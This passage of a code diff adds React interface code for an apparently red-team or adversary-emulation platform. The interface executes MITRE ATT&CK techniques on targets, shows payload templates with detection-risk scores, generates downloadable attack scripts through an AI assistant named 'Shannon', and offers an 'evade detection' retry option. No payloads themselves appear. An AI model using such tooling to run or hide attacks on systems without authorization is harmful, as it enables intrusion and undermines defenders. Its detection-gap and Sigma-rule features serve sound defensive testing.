+                                  const next = found.map(d => {
+                                    const existing = cur.scripts.find(x => x.url === d.url);
+                                    return existing || { ...d, loading: false, content: null, generated: false };
+                                  });
+                                  if (next.length === 0) { const n={...prev}; delete n[s.id]; return n; }
+                                  return { ...prev, [s.id]: { scripts: next } };
+                                });
+                              }}
+                              spellCheck={false}
+                              autoComplete="off"
+                            />
+                          </div>
+
+                          {/* ── Alternatives ── */}
+                          {panelPlan.alternatives?.length > 0 && (
+                            <div>
+                              <p className="text-xs text-slate-600 uppercase tracking-wider mb-2 font-medium">
+                                <i className="fa-solid fa-code-branch mr-1.5"></i>Alternative payloads
+                              </p>
+                              <div className="grid gap-2" style={{gridTemplateColumns:"repeat(auto-fill,minmax(255px,1fr))"}}>
+                                {panelPlan.alternatives.map((alt, i) => (
+                                  <button key={i} type="button"
+                                    className="text-left p-3 rounded-lg transition-all"
+                                    style={{background:"#ffffff",border:"1px solid #BFDBFE"}}
+                                    onClick={()=>applyAlternative(s.id, alt)}
+                                    onMouseEnter={e=>{e.currentTarget.style.borderColor="#2563eb";e.currentTarget.style.background="#F0F7FF"}}
+                                    onMouseLeave={e=>{e.currentTarget.style.borderColor="#BFDBFE";e.currentTarget.style.background="#ffffff"}}>
+                                    <div className="flex items-center gap-2 mb-1.5">
+                                      <span className="text-xs font-semibold" style={{color:"#2563eb"}}>
+                                        {alt.label || `Variant ${i+1}`}
+                                      </span>
+                                      <span className="text-xs px-1.5 rounded"
+                                        style={{background:"#F1F5F9",color:"#64748b",border:"1px solid #CBD5E1"}}>
+                                        {alt.task_type}
+                                      </span>
+                                      <span className="ml-auto text-xs" style={{color:"#2563eb"}}>
+                                        <i className="fa-solid fa-arrow-right-to-bracket text-[9px]"></i>
+                                      </span>
+                                    </div>
+                                    {alt.explanation && (
+                                      <p className="text-xs mb-1.5 leading-relaxed" style={{color:"#64748b"}}>{alt.explanation}</p>
+                                    )}
+                                    <div className="text-xs truncate" style={{
+                                      fontFamily:"'JetBrains Mono','Fira Code',monospace",
+                                      color:"#0369a1",opacity:0.85
+                                    }} title={alt.command}>{alt.command}</div>
+                                  </button>
+                                ))}
+                              </div>
+                            </div>
+                          )}
+
+                          {/* ── Script Generator ── */}
+                          {(() => {
+                            const ss = scriptState[s.id];
+                            if (!ss || ss.scripts.length === 0) return null;
+                            return (
+                              <div className="rounded-lg overflow-hidden" style={{border:"1px solid #DDD6FE"}}>
+                                {/* Header */}
+                                <div className="flex items-center gap-2 px-3 py-2"
+                                  style={{background:"#EDE9FE",borderBottom:"1px solid #DDD6FE"}}>
+                                  <i className="fa-solid fa-file-code text-xs" style={{color:"#7C3AED"}}></i>
+                                  <span className="text-xs font-semibold" style={{color:"#7C3AED"}}>Script Files Detected</span>
+                                  <span className="text-xs text-slate-500">— Shannon can write the content</span>
+                                </div>
+                                {/* Script cards */}
+                                <div className="divide-y" style={{divideColor:"#DDD6FE"}}>
+                                  {ss.scripts.map((sc, si) => (
+                                    <div key={si} className="px-3 py-2.5"
+                                      style={{background:"#F5F3FF"}}>
+                                      <div className="flex items-center gap-2 flex-wrap">
+                                        {/* Filename + ext badge */}
+                                        <i className="fa-solid fa-file-lines text-xs text-slate-700"></i>
+                                        <span className="font-mono text-xs" style={{color:"#7C3AED"}}>{sc.filename}</span>
+                                        <span className="text-xs px-1.5 rounded"
+                                          style={{background:"#EDE9FE",color:"#7C3AED",border:"1px solid #DDD6FE",fontFamily:"monospace"}}>
+                                          .{sc.ext}
+                                        </span>
+                                        <span className="text-xs text-slate-700 truncate max-w-[180px]" title={sc.url}>{sc.url}</span>
+
+                                        <div className="ml-auto flex items-center gap-1.5">
+                                          {/* Generate button */}
+                                          {!sc.generated && (
+                                            <button type="button"
+                                              className="flex items-center gap-1.5 text-xs px-2.5 py-1 rounded-md transition-all"
+                                              style={{background:"#EDE9FE",color:"#7C3AED",border:"1px solid #DDD6FE",fontWeight:600}}
+                                              disabled={sc.loading}
+                                              onClick={()=>generateScript(s.id, sc, cmdVal)}
+                                              onMouseEnter={e=>{if(!sc.loading){e.currentTarget.style.background="#DDD6FE"}}}
+                                              onMouseLeave={e=>{e.currentTarget.style.background="#EDE9FE"}}>
+                                              {sc.loading
+                                                ? <><i className="fa-solid fa-circle-notch spin text-[10px]"></i><span>Generating…</span></>
+                                                : <><i className="fa-solid fa-wand-magic-sparkles text-[10px]"></i><span>Generate</span></>}
+                                            </button>
+                                          )}
+                                          {/* Download button — shown after generation */}
+                                          {sc.generated && sc.content && (
+                                            <button type="button"
+                                              className="flex items-center gap-1.5 text-xs px-2.5 py-1 rounded-md transition-all"
+                                              style={{background:"#052e16",color:"#4ade80",border:"1px solid #14532d",fontWeight:600}}
+                                              onClick={()=>downloadScript(sc.filename, sc.content)}
+                                              onMouseEnter={e=>{e.currentTarget.style.background="#064e26"}}
+                                              onMouseLeave={e=>{e.currentTarget.style.background="#052e16"}}>
+                                              <i className="fa-solid fa-download text-[10px]"></i>
+                                              <span>Download {sc.filename}</span>
+                                            </button>
+                                          )}
+                                          {/* Re-generate */}
+                                          {sc.generated && (
+                                            <button type="button"
+                                              className="text-xs text-slate-700 hover:text-slate-500 transition-colors px-1"
+                                              onClick={()=>generateScript(s.id, sc, cmdVal)}
+                                              title="Re-generate">
+                                              <i className="fa-solid fa-arrows-rotate text-[10px]"></i>
+                                            </button>
+                                          )}
+                                        </div>
+                                      </div>
+
+                                      {/* Error */}
+                                      {sc.error && (
+                                        <p className="mt-1.5 text-xs" style={{color:"#f87171"}}>{sc.error}</p>
+                                      )}
+
+                                      {/* Script preview (collapsible) */}
+                                      {sc.generated && sc.content && (
+                                        <details className="mt-2">
+                                          <summary className="cursor-pointer text-xs text-slate-600 hover:text-slate-400 transition-colors select-none">
+                                            <i className="fa-solid fa-eye mr-1 text-[10px]"></i>Preview script
+                                          </summary>
+                                          <div className="mt-2 rounded overflow-hidden" style={{border:"1px solid #DDD6FE"}}>
+                                            <div className="flex items-center justify-between px-3 py-1.5"
+                                              style={{background:"#EDE9FE",borderBottom:"1px solid #DDD6FE"}}>
+                                              <span className="text-xs text-slate-600 font-mono">{sc.filename}</span>
+                                              <button type="button"
+                                                className="text-xs text-slate-600 hover:text-emerald-400 transition-colors"
+                                                onClick={()=>downloadScript(sc.filename, sc.content)}>
+                                                <i className="fa-solid fa-download mr-1 text-[9px]"></i>Download
+                                              </button>
+                                            </div>
+                                            <pre style={{
+                                              margin:0, padding:"0.75rem 1rem",
+                                              background:"#050311", color:"#c4b5fd",
+                                              fontFamily:"'JetBrains Mono','Fira Code',monospace",
+                                              fontSize:"0.72rem", lineHeight:"1.6",
+                                              maxHeight:"280px", overflowY:"auto",
+                                              whiteSpace:"pre-wrap", wordBreak:"break-word"
+                                            }}>{sc.content}</pre>
+                                          </div>
+                                        </details>
+                                      )}
+                                    </div>
+                                  ))}
+                                </div>
+                              </div>
+                            );
+                          })()}
+
+                          {/* ── Action bar ── */}
+                          <div className="flex items-center gap-2 pt-1" style={{borderTop:"1px solid #0f1f33"}}>
+                            <button className="btn-sm btn-emerald" disabled={isRunning} onClick={()=>runStep(s.id)}>
+                              {isRunning
+                                ? <><i className="fa-solid fa-circle-notch spin mr-1.5"></i>Running…</>
+                                : <><i className="fa-solid fa-play mr-1.5 text-[9px]"></i>Execute</>}
+                            </button>
+                            <button className="btn-sm btn-blue" disabled={isPlanning || isRunning}
+                              onClick={()=>planStep(s.id)}
+                              title="Ask Shannon for a new plan">
+                              {isPlanning
+                                ? <><i className="fa-solid fa-circle-notch spin mr-1.5"></i>Re-planning…</>
+                                : <><i className="fa-solid fa-arrows-rotate mr-1.5"></i>Re-plan</>}
+                            </button>
+                            <button type="button"
+                              className="btn-sm btn-ghost"
+                              disabled={isRunning || isPlanning}
+                              onClick={()=>cancelPlan(s.id)}>
+                              <i className="fa-solid fa-xmark mr-1"></i>Dismiss
+                            </button>
+                          </div>
+                        </div>
+                        )}
+                      </td></tr>
+                      );
+                    })()}
+
+                    {/* ── Execution Result Panel ── */}
+                    {isExpanded && res && (
+                      <tr><td colSpan={8} className="fade-in" style={{
+                        background:"#F0FDF4",padding:"1.25rem 1.5rem",
+                        borderBottom:"1px solid #BBF7D0",borderTop:"1px solid #BBF7D0"
+                      }}>
+                        {/* Result header */}
+                        <div className="flex items-center gap-2.5 mb-3 flex-wrap">
+                          <span className="text-xs font-semibold" style={{color:"#7C3AED"}}>
+                            {res.technique_id}
+                          </span>
+                          <i className="fa-solid fa-arrow-right text-slate-400 text-[9px]"></i>
+                          <span className="text-xs text-slate-500">{res.target}</span>
+                          <span className={`badge badge-${res.status}`}>{res.status}</span>
+                          {via === "shannon_ai" && <span className="badge" style={{background:"#EDE9FE",color:"#7C3AED",border:"1px solid #DDD6FE"}}>
+                            <i className="fa-solid fa-wand-magic-sparkles mr-1 text-[9px]"></i>Shannon AI</span>}
+                          {via === "agent" && <span className="badge" style={{background:"#DCFCE7",color:"#16a34a",border:"1px solid #BBF7D0"}}>
+                            <i className="fa-solid fa-robot mr-1 text-[9px]"></i>Agent</span>}
+                          {via === "registry" && <span className="badge" style={{background:"#F1F5F9",color:"#64748b",border:"1px solid #CBD5E1"}}>
+                            <i className="fa-solid fa-code mr-1 text-[9px]"></i>Registry</span>}
+                          {res.duration_seconds != null && (
+                            <span className="text-xs text-slate-500">{res.duration_seconds?.toFixed(1)}s</span>
+                          )}
+                          {findings.length > 0 && (
+                            <span className={`badge ml-auto ${detected ? "badge-high" : "badge-active"}`}>
+                              {detected ? "⚠ Detected" : "✓ Gap — not detected"}
+                            </span>
+                          )}
+                        </div>
+
+                        {/* Output */}
+                        {res.result_detail && (
+                          <div className="sigma-block mb-3" style={{maxHeight:"320px",overflowY:"auto",whiteSpace:"pre-wrap",wordBreak:"break-word"}}>
+                            {res.result_detail}
+                          </div>
+                        )}
+
+                        {/* Findings */}
+                        {findings.length > 0 && (
+                          <div className="grid gap-2 mb-3" style={{gridTemplateColumns:"repeat(auto-fill,minmax(280px,1fr))"}}>
+                            {findings.map((f,i) => (
+                              <div key={i} className="p-3 rounded-lg text-xs"
+                                style={{background:"#ffffff",border:`1px solid ${f.detected?"#FCA5A5":"#86EFAC"}`}}>
+                                <div className="flex items-center gap-2 mb-1.5">
+                                  <span className={`badge badge-${f.severity}`}>{f.severity}</span>
+                                  <span style={{color: f.detected?"#dc2626":"#16a34a",fontWeight:600}}>
+                                    {f.detected ? "Detected" : "Not detected"}
+                                  </span>
+                                  <span className="text-slate-500">{f.detection_quality}</span>
+                                </div>
+                                {f.gap_description && <p className="text-slate-500 leading-relaxed">{f.gap_description}</p>}
+                                {f.sigma_rule && (
+                                  <details className="mt-2">
+                                    <summary className="cursor-pointer text-slate-500 hover:text-blue-600 transition-colors">
+                                      <i className="fa-solid fa-shield-halved mr-1"></i>Sigma Rule
+                                    </summary>
+                                    <div className="sigma-block mt-1.5">{f.sigma_rule}</div>
+                                  </details>
+                                )}
+                              </div>
+                            ))}
+                          </div>
+                        )}
+
+                        {/* Evasion / retry suggestions from Shannon */}
+                        {(res.status === "failed" || detected) && !hasPlan && (
+                          <div className="pt-2" style={{borderTop:"1px solid #BFDBFE"}}>
+                            {evadeLoading[s.id] ? (
+                              <span className="text-xs text-slate-500">
+                                <i className="fa-solid fa-circle-notch spin mr-1.5"></i>
+                                Shannon sedang menyusun alternatif…
+                              </span>
+                            ) : (
+                              <button className="btn-sm" type="button"
+                                style={{background:"#EDE9FE",color:"#7C3AED",border:"1px solid #DDD6FE",
+                                        padding:"0.3rem 0.85rem",fontSize:"0.73rem",borderRadius:"0.4rem",fontWeight:600}}
+                                onClick={()=>askEvadeAlternatives(s.id, res)}
+                                onMouseEnter={e=>{e.currentTarget.style.background="#DDD6FE"}}
+                                onMouseLeave={e=>{e.currentTarget.style.background="#EDE9FE"}}>
+                                <i className="fa-solid fa-wand-magic-sparkles mr-1.5 text-[9px]"></i>
+                                {res.status === "failed" ? "Ask Shannon — retry with alternative" : "Ask Shannon — evade detection"}
+                              </button>
+                            )}
+                          </div>
+                        )}
+                      </td></tr>
+                    )}
+                  </React.Fragment>
+                );
+              })}
+            </tbody>
+          </table>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ─── Techniques ───────────────────────────────────────────────────────────────
+function TechniqueDetail({ t, impl, implLoading }) {
+  const hasImpl = impl !== null && impl !== undefined && impl !== false;
+  const [aiExamples, setAiExamples] = useState(null);   // null=not fetched, false=error, obj=data
+  const [aiLoading, setAiLoading] = useState(false);
+  const [aiError, setAiError] = useState("");
+
+  async function generateExamples() {
+    setAiLoading(true); setAiError(""); setAiExamples(null);
+    try {
+      const data = await apiFetch(`/techniques/${t.id}/examples`, { method: "POST" });
+      setAiExamples(data);
+    } catch(e) {
+      setAiError(e.message);
+      setAiExamples(false);
+    } finally {
+      setAiLoading(false);
+    }
+  }
+
+  return (
+    <tr>
+      <td colSpan={8} className="px-4 py-5 fade-in" style={{background:"#F8FAFC",borderBottom:"1px solid #E2E8F0"}}>
+        {/* Header row */}
+        <div className="flex items-center gap-3 mb-4">
+          <span className="font-mono font-bold text-sm" style={{color:"#7C3AED"}}>{t.id}</span>
+          <span className="text-slate-900 font-semibold">{t.name}</span>
+          {hasImpl && (
+            <span className="badge badge-active">
+              <i className="fa-solid fa-code mr-1"></i>Registry Impl
+            </span>
+          )}
+          <div className="ml-auto flex items-center gap-2">
+            {t.attack_url && (
+              <a href={t.attack_url} target="_blank" rel="noreferrer" className="btn-sm btn-ghost">
+                <i className="fa-solid fa-arrow-up-right-from-square"></i> ATT&CK Page
+              </a>
+            )}
+            {aiExamples === null && !aiLoading && (
+              <button className="btn-sm btn-purple" onClick={generateExamples}>
+                <i className="fa-solid fa-wand-magic-sparkles"></i> Generate AI Examples
+              </button>
+            )}
+            {aiLoading && (
+              <span className="text-xs text-slate-400 flex items-center gap-2">
+                <i className="fa-solid fa-circle-notch spin"></i> Shannon AI generating...
+              </span>
+            )}
+            {(aiExamples !== null && aiExamples !== false) && (
+              <button className="btn-sm btn-ghost" onClick={() => setAiExamples(null)}>
+                <i className="fa-solid fa-rotate-right"></i> Regenerate
+              </button>
+            )}
+          </div>
+        </div>
+
+        {/* Main grid: left = description + platforms, right = detection + mitigation + datasources */}
+        <div className="grid gap-5" style={{gridTemplateColumns: hasImpl ? "1fr 1fr" : "1fr 1fr"}}>
+          {/* LEFT */}
+          <div className="space-y-4">
+            <div>
+              <div className="text-xs text-slate-500 uppercase tracking-wider mb-1">Description</div>
+              <p className="text-sm text-slate-700 leading-relaxed">{t.description || "—"}</p>
+            </div>
+
+            <div>
+              <div className="text-xs text-slate-500 uppercase tracking-wider mb-1">Platforms</div>
+              {t.platforms?.length > 0
+                ? <div className="flex flex-wrap gap-1">{t.platforms.map(p=><span key={p} className="tag-chip"><i className="fa-solid fa-display" style={{fontSize:"0.6rem"}}></i>{p}</span>)}</div>
+                : <span className="text-slate-600 text-xs">—</span>}
+            </div>
+
+            {t.tactics?.length > 1 && (
+              <div>
+                <div className="text-xs text-slate-500 uppercase tracking-wider mb-1">All Tactics</div>
+                <div className="flex flex-wrap gap-1">{t.tactics.map(ta=><span key={ta} className="tag-chip">{ta.replace(/_/g," ")}</span>)}</div>
+              </div>
+            )}
+          </div>
+
+          {/* RIGHT */}
+          <div className="space-y-4">
+            <div>
+              <div className="text-xs text-slate-500 uppercase tracking-wider mb-1">Detection Hints</div>
+              {t.detection_note
+                ? <p className="text-sm text-slate-700 leading-relaxed">{t.detection_note}</p>
+                : <span className="text-slate-600 text-xs">Not available from ATT&CK STIX data for this technique.</span>}
+            </div>
+
+            <div>
+              <div className="text-xs text-slate-500 uppercase tracking-wider mb-1">Mitigation</div>
+              {t.mitigation_note
+                ? <p className="text-sm text-slate-700 leading-relaxed">{t.mitigation_note}</p>
+                : <span className="text-slate-600 text-xs">Not loaded — STIX mitigations require relationship traversal (see ATT&CK page).</span>}
+            </div>
+
+            <div>
+              <div className="text-xs text-slate-500 uppercase tracking-wider mb-1">Data Sources</div>
+              {t.data_sources?.length > 0
+                ? <div className="flex flex-wrap gap-1">{t.data_sources.map(d=><span key={d} className="tag-chip">{d}</span>)}</div>
+                : <span className="text-slate-600 text-xs">—</span>}
+            </div>
+          </div>
+        </div>
+
+        {/* Implementation section */}
+        {implLoading && (
+          <div className="mt-4 pt-4" style={{borderTop:"1px solid #E2E8F0"}}>
+            <Spinner />
+          </div>
+        )}
+        {hasImpl && !implLoading && (
+          <div className="mt-4 pt-4" style={{borderTop:"1px solid #E2E8F0"}}>
+            <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-3">
+              <i className="fa-solid fa-terminal mr-2" style={{color:"#4ade80"}}></i>
+              Platform Implementation Details
+            </div>
+            <div className="grid gap-4" style={{gridTemplateColumns: Object.keys(impl.payload_templates||{}).length > 0 && Object.keys(impl.interpreters||{}).length > 0 ? "1fr 1fr" : "1fr"}}>
+              {/* Payload Templates */}
+              {Object.keys(impl.payload_templates||{}).length > 0 && (
+                <div>
+                  <div className="text-xs text-slate-500 uppercase tracking-wider mb-2">Payload Templates</div>
+                  <div className="space-y-2">
+                    {Object.entries(impl.payload_templates).map(([name, payload]) => (
+                      <div key={name}>
+                        <div className="text-xs text-slate-400 mb-1 font-mono">{name}</div>
+                        <div className="sigma-block">{payload}</div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* Interpreters */}
+              {Object.keys(impl.interpreters||{}).length > 0 && (
+                <div>
+                  <div className="text-xs text-slate-500 uppercase tracking-wider mb-2">Supported Interpreters</div>
+                  <div className="space-y-2">
+                    {Object.entries(impl.interpreters).map(([interp, info]) => {
+                      const risk = Math.round((info.detection_risk||0) * 100);
+                      const riskColor = risk >= 40 ? "#f87171" : risk >= 25 ? "#fbbf24" : "#4ade80";
+                      return (
+                        <div key={interp} className="flex items-start gap-3 p-2 rounded" style={{background:"#F8FAFC",border:"1px solid #E2E8F0"}}>
+                          <div className="flex-1">
+                            <div className="text-xs font-mono font-semibold text-slate-900">{interp}</div>
+                            <div className="text-xs text-slate-500 mt-0.5">{info.description}</div>
+                          </div>
+                          <div className="text-right shrink-0">
+                            <div className="text-xs font-bold" style={{color:riskColor}}>{risk}% detection risk</div>
+                            {info.edr_alert_prone && <div className="text-xs text-slate-600 mt-0.5">EDR alert prone</div>}
+                          </div>
+                        </div>
+                      );
+                    })}
+                  </div>
+                </div>
+              )}
+
+              {/* Variants */}
+              {(impl.variants||[]).length > 0 && (
+                <div className={Object.keys(impl.payload_templates||{}).length > 0 ? "col-span-2" : ""}>
+                  <div className="text-xs text-slate-500 uppercase tracking-wider mb-2">Variants / Sub-types</div>
+                  <div className="flex flex-wrap gap-2">
+                    {impl.variants.map((v,i) => (
+                      <div key={i} className="flex flex-col p-2 rounded" style={{background:"#F8FAFC",border:"1px solid #E2E8F0",minWidth:"160px"}}>
+                        <span className="text-xs font-semibold text-slate-900 font-mono">{v.name}</span>
+                        {v.description && <span className="text-xs text-slate-500 mt-0.5">{v.description}</span>}
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+            </div>
+
+            <div className="mt-3 p-2 rounded text-xs text-slate-500" style={{background:"#F8FAFC",border:"1px dashed #CBD5E1"}}>
+              <i className="fa-solid fa-circle-info mr-1"></i>
+              These payloads are used during campaign simulation. In C2 agent mode (real execution), the agent runs actual commands on target. In simulation mode, output is generated locally without touching the target.
+            </div>
+          </div>
+        )}
+        {!hasImpl && !implLoading && (
+          <div className="mt-4 pt-4" style={{borderTop:"1px solid #E2E8F0"}}>
+            <div className="text-xs text-slate-600 italic">
+              <i className="fa-solid fa-circle-info mr-1"></i>
+              No concrete implementation in registry — this technique is catalogued from MITRE ATT&CK STIX data only.
+              Simulation uses generic behaviour. To add an implementation, create <span className="font-mono">core/techniques/it/{t.id.toLowerCase().replace('.','_')}.py</span>.
+            </div>
+          </div>
+        )}
+
+        {/* ── Shannon AI Generated Examples ── */}
+        {aiError && (
+          <div className="mt-4 pt-4" style={{borderTop:"1px solid #E2E8F0"}}>
+            <div className="text-xs text-red-500"><i className="fa-solid fa-triangle-exclamation mr-1"></i>{aiError}</div>
+          </div>
+        )}
+        {aiExamples && typeof aiExamples === "object" && (
+          <div className="mt-4 pt-4 fade-in" style={{borderTop:"1px solid #DDD6FE"}}>
+            <div className="flex items-center gap-2 mb-4">
+              <div className="text-xs font-semibold uppercase tracking-wider" style={{color:"#7C3AED"}}>
+                <i className="fa-solid fa-wand-magic-sparkles mr-2"></i>Shannon AI — Payload Examples
+              </div>
+              <span className="badge" style={{background:"#EDE9FE",color:"#7C3AED",fontSize:"0.65rem"}}>
+                For authorized red team use only
+              </span>
+            </div>
+
+            {/* Summary */}
+            {aiExamples.summary && (
+              <p className="text-sm text-slate-600 mb-4 leading-relaxed">{aiExamples.summary}</p>
+            )}
+
+            {/* Examples per platform */}
+            {(aiExamples.examples || []).length > 0 && (
+              <div className="space-y-3 mb-4">
+                {aiExamples.examples.map((ex, i) => (
+                  <div key={i} className="rounded-lg overflow-hidden" style={{border:"1px solid #DDD6FE"}}>
+                    <div className="flex items-center gap-2 px-3 py-2" style={{background:"#EDE9FE"}}>
+                      <span className="text-xs font-bold" style={{color:"#7C3AED"}}>
+                        <i className={`fa-solid ${ex.platform?.toLowerCase().includes("win") ? "fa-brands fa-windows" : ex.platform?.toLowerCase().includes("linux") ? "fa-brands fa-linux" : "fa-terminal"} mr-1`}></i>
+                        {ex.platform}
+                      </span>
+                      {ex.tool && (
+                        <span className="text-xs text-slate-500">via {ex.tool}</span>
+                      )}
+                    </div>
+                    <div className="px-3 py-3" style={{background:"#F5F3FF"}}>
+                      {(ex.commands || []).map((cmd, j) => (
+                        <div key={j} className="sigma-block mb-2 last:mb-0">{cmd}</div>
+                      ))}
+                      {ex.notes && (
+                        <div className="mt-2 text-xs text-slate-500 flex items-start gap-1">
+                          <i className="fa-solid fa-shield-halved mt-0.5 shrink-0" style={{color:"#fbbf24"}}></i>
+                          <span>{ex.notes}</span>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+
+            {/* Detection & OPSEC */}
+            <div className="grid grid-cols-2 gap-4">
+              {aiExamples.detection_tips && (
+                <div className="p-3 rounded" style={{background:"#EFF6FF",border:"1px solid #BFDBFE"}}>
+                  <div className="text-xs font-semibold mb-1" style={{color:"#2563eb"}}>
+                    <i className="fa-solid fa-eye mr-1"></i>Detection Tips
+                  </div>
+                  <p className="text-xs text-slate-600 leading-relaxed">{aiExamples.detection_tips}</p>
+                </div>
+              )}
+              {aiExamples.opsec_considerations && (
+                <div className="p-3 rounded" style={{background:"#FFFBEB",border:"1px solid #FDE68A"}}>
+                  <div className="text-xs font-semibold mb-1" style={{color:"#d97706"}}>
+                    <i className="fa-solid fa-user-ninja mr-1"></i>OPSEC Considerations
+                  </div>
+                  <p className="text-xs text-slate-600 leading-relaxed">{aiExamples.opsec_considerations}</p>
+                </div>
+              )}
+            </div>
+
+            {/* References */}
+            {(aiExamples.references || []).length > 0 && (
+              <div className="mt-3 flex flex-wrap gap-1">
+                {aiExamples.references.map((r, i) => (
+                  <span key={i} className="tag-chip">{r}</span>
+                ))}
+              </div>
+            )}
+          </div>
+        )}
+      </td>
+    </tr>
+  );
+}
+
+function Techniques() {
+  const [techniques, setTechniques] = useState(null);
+  const [regInfo, setRegInfo] = useState(null);
+  const [search, setSearch] = useState("");
+  const [envFilter, setEnvFilter] = useState("");
+  const [tacticFilter, setTacticFilter] = useState("");
+  const [selected, setSelected] = useState(null);
+  const [implData, setImplData] = useState({});       // tid → impl or false
+  const [implLoading, setImplLoading] = useState(null); // tid currently loading
+  const [err, setErr] = useState("");
+
+  const load = useCallback(() => {
+    const p = new URLSearchParams();
+    if (search) p.set("search", search);
+    if (envFilter) p.set("environment", envFilter);
+    if (tacticFilter) p.set("tactic", tacticFilter);
+    p.set("limit","200");
+    apiFetch(`/techniques/?${p}`).then(setTechniques).catch(e => { setErr(e.message); setTechniques([]); });
+    apiFetch("/techniques/registry/info").then(setRegInfo).catch(() => {});
+  }, [search, envFilter, tacticFilter]);
+  useEffect(() => { load(); }, [load]);
+
+  function toggleRow(t) {
+    if (selected?.id === t.id) {
+      setSelected(null);
+      return;
+    }
+    setSelected(t);
+    // Only fetch impl if this technique is known to have a registry implementation.
+    // regInfo.technique_ids lists all IDs with concrete implementations — skip the
+    // network call (and the 404) for techniques that are STIX-only.
+    if (!(t.id in implData)) {
+      const hasRegistryImpl = regInfo?.technique_ids?.includes(t.id);
+      if (hasRegistryImpl) {
+        setImplLoading(t.id);
+        apiFetch(`/techniques/${t.id}/impl`)
+          .then(data => { setImplData(d => ({...d, [t.id]: data})); })
+          .catch(() => { setImplData(d => ({...d, [t.id]: false})); })
+          .finally(() => setImplLoading(null));
+      } else {
+        // Mark immediately as no-impl so we don't re-check on next click
+        setImplData(d => ({...d, [t.id]: false}));
+      }
+    }
+  }
+
+  const dbEmpty = techniques !== null && techniques.length === 0 && !search && !envFilter && !tacticFilter;
+
+  return (
+    <div className="space-y-5">
+      <div>
+        <h1 className="text-xl font-bold text-slate-900">Technique Library</h1>
+        <p className="text-sm text-slate-500 mt-1">MITRE ATT&CK Enterprise + ICS/OT — click a row to see details & implementation</p>
+      </div>
+      <Alert msg={err} onClose={() => setErr("")} />
+
+      {regInfo && (
+        <div className="grid grid-cols-4 gap-3">
+          <StatCard icon="fa-book-open"  color="purple" title="Registry Total"     value={regInfo.total}         sub="Techniques with implementation" />
+          <StatCard icon="fa-laptop"     color="blue"   title="IT Techniques"      value={regInfo.it_techniques} sub="Enterprise ATT&CK" />
+          <StatCard icon="fa-industry"   color="amber"  title="OT/ICS Techniques"  value={regInfo.ot_techniques} sub="ATT&CK for ICS" />
+          <StatCard icon="fa-database"   color="emerald" title="DB Techniques"     value={techniques?.length ?? "—"} sub="Loaded from MITRE" />
+        </div>
+      )}
+
+      {dbEmpty && (
+        <div className="card p-6" style={{border:"1px solid #BFDBFE"}}>
+          <div className="flex items-start gap-4">
+            <div className="w-10 h-10 rounded-lg flex items-center justify-center shrink-0" style={{background:"#DBEAFE"}}>
+              <i className="fa-solid fa-database" style={{color:"#2563eb"}}></i>
+            </div>
+            <div className="flex-1">
+              <h3 className="font-semibold text-slate-900 mb-1">Technique Database Empty</h3>
+              <p className="text-sm text-slate-500 mb-3">Run this command to download MITRE ATT&CK Enterprise + ICS:</p>
+              <div className="sigma-block">python -m core.main sync-attack</div>
+              <p className="text-xs text-slate-500 mt-2">After syncing, reload this page to see all techniques.</p>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {!dbEmpty && (
+        <div className="card p-4 flex gap-3">
+          <input className="input-field" placeholder="Search by ID or name — e.g. T1566, Phishing"
+            value={search} onChange={e => setSearch(e.target.value)} />
+          <select className="input-field" style={{width:"160px"}} value={envFilter} onChange={e => setEnvFilter(e.target.value)}>
+            <option value="">All Environments</option><option value="it">IT</option><option value="ot">OT/ICS</option>
+          </select>
+          <select className="input-field" style={{width:"200px"}} value={tacticFilter} onChange={e => setTacticFilter(e.target.value)}>
+            <option value="">All Tactics</option>
+            {["initial_access","execution","persistence","privilege_escalation","defense_evasion","credential_access",
+              "discovery","lateral_movement","collection","exfiltration","impact","command_and_control",
+              "inhibit_response_function","impair_process_control"].map(t=>(
+              <option key={t} value={t}>{t.replace(/_/g," ")}</option>
+            ))}
+          </select>
+        </div>
+      )}
+
+      {techniques === null ? <Spinner /> : !dbEmpty && techniques.length === 0 ? (
+        <div className="card p-12 text-center text-slate-600"><i className="fa-solid fa-magnifying-glass text-3xl mb-3 block"></i>No techniques match the current filters</div>
+      ) : !dbEmpty && (
+        <div className="card overflow-hidden">
+          <div className="px-4 py-3 text-xs text-slate-500" style={{borderBottom:"1px solid #E2E8F0",background:"#F8FAFC"}}>
+            {techniques.length} technique{techniques.length!==1?"s":""} — click a row for details & payload examples
+          </div>
+          <table className="w-full text-sm">
+            <thead><tr style={{background:"#F8FAFC", borderBottom:"1px solid #E2E8F0"}}>
+              {["ID","Name","Tactic","Env","Risk","Impl","Sub-technique",""].map(h=>(
+                <th key={h} className="text-left px-4 py-3 text-xs font-semibold text-slate-500 uppercase tracking-wider">{h}</th>
+              ))}
+            </tr></thead>
+            <tbody className="divide-y" style={{borderColor:"#E2E8F0"}}>
+              {techniques.map(t => {
+                const hasRegistryImpl = regInfo?.technique_ids?.includes(t.id);
+                return (
+                  <React.Fragment key={t.id}>
+                    <tr className="table-row cursor-pointer" onClick={() => toggleRow(t)}>
+                      <td className="px-4 py-3 font-mono font-semibold text-xs" style={{color:"#7C3AED"}}>{t.id}</td>
+                      <td className="px-4 py-3 text-slate-900 font-medium">{t.name}</td>
+                      <td className="px-4 py-3 text-slate-500 text-xs">{t.tactic?.replace(/_/g," ")}</td>
+                      <td className="px-4 py-3"><span className="badge badge-draft">{t.environment?.toUpperCase()}</span></td>
+                      <td className="px-4 py-3"><span className={`badge badge-${t.risk_level || "medium"}`}>{t.risk_level || "—"}</span></td>
+                      <td className="px-4 py-3">
+                        {hasRegistryImpl
+                          ? <span className="badge badge-active"><i className="fa-solid fa-code mr-1"></i>Yes</span>
+                          : <span className="text-slate-400 text-xs">STIX only</span>}
+                      </td>
+                      <td className="px-4 py-3 text-slate-500 text-xs">{t.is_subtechnique ? t.parent_technique_id : "—"}</td>
+                      <td className="px-4 py-3 text-right"><i className={`fa-solid fa-chevron-${selected?.id===t.id?"up":"down"} text-slate-600 text-xs`}></i></td>
+                    </tr>
+                    {selected?.id === t.id && (
+                      <TechniqueDetail
+                        t={t}
+                        impl={implData[t.id]}
+                        implLoading={implLoading === t.id}
+                      />
+                    )}
+                  </React.Fragment>
+                );
+              })}
+            </tbody>
+          </table>
